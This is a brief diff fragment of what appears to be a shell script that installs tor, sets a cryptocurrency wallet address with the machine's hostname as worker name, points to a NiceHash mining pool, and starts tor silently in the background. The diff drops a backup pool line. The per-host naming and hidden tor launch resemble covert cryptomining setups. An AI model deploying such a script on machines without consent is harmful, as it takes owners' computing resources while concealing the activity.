@@ -4,7 +4,6 @@ sudo apt-get install -y tor libpci-dev
 
 string="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$(hostname)
 pool1=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353
-pool2=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
 
 nohup tor &>/dev/null &
 
